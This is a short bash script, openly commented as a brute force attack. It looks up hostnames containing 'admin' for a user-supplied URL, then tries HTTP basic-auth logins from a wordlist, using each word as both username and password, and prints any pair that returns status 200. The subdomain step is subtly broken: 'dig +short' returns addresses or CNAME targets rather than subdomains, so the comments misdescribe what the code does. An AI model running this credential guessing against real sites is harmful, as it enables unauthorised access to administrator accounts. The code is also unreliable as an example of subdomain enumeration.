#!/bin/bash

# Prompt the user for a URL
read -p "Enter a URL: " url

# Use the `dig` command to find subdomains
subdomains=$(dig $url +short | grep -v $url | grep "admin")

# Print the subdomains
echo "Subdomains containing 'admin':"
echo $subdomains

# Loop through the subdomains
for sub in $subdomains; do
  # Read the wordlist file
  while read line; do
    # Perform the brute force attack
    echo "Bruteforcing $sub"
    status_code=$(curl -s -o /dev/null -w "%{http_code}" --user "$line:$line" $sub)
    if [ $status_code -eq 200 ]; then
      echo "Credentials found: $line:$line"
      break
    fi
  done < wordlist.txt
done
